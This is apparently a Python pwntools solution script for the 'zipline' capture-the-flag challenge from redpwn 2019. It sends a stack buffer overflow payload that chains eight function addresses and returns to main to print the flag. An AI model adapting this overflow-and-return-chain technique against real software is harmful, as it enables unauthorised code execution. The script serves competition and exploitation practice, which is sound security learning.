from pwn import *
e = ELF("./zipline")
#p = process("./zipline")
p = remote("chall.2019.redpwn.net", 4005)

main = 0x080494f6
places = ["air", "water", "land", "underground", "limbo", "hell", "minecraft_nether", "bedrock"]
payload = 'a'*22
for i in places:
	payload += p32(e.symbols[i])
payload += p32(main)  # back to main
p.sendlineafter("hell?",payload)
p.interactive()  # answer to "Ready..." with anything again and then the flag prints